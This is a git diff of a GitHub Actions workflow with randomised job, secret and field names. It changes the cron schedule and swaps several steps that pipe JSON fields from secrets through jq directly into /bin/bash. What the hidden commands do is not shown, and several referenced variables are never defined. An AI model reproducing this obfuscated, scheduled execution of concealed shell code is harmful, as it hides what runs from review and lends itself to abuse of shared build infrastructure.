@@ -2,7 +2,7 @@ name: guoxiuqing2678
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 2/6 * * *'
+    - cron: '4 4/6 * * *'
 
 jobs:
   build:
@@ -11,15 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: guoxiuqing2678
         env:
-          rdda84138: ${{ secrets.rdda84138 }}
+          yz41871: ${{ secrets.yz41871 }}
         run: |
-          echo $rdda84138 | jq -r .ccoc39 | /bin/bash
-          echo $jx63280 | jq -r .ikd7 | /bin/bash
-          echo $xs1076 | jq -r .wfohg01 | /bin/bash
-          echo $dy168 | jq -r .ydfns65 | /bin/bash
-          echo $pq63523 | jq -r .ac274 | /bin/bash
-          echo $j49588 | jq -r .c636 | /bin/bash
-          echo $alz8 | jq -r .o130 | /bin/bash
-          echo $tosw90103 | jq -r .erbp15 | /bin/bash
-          echo $nxjkc01478 | jq -r .zwl28244 | /bin/bash
+          echo $yz41871 | jq -r .lcxph45 | /bin/bash
+          echo $jhagx31 | jq -r .iewtg865 | /bin/bash
+          echo $bjkac3282 | jq -r .pcg91 | /bin/bash
+          echo $scir5955 | jq -r .gxcf31676 | /bin/bash
 
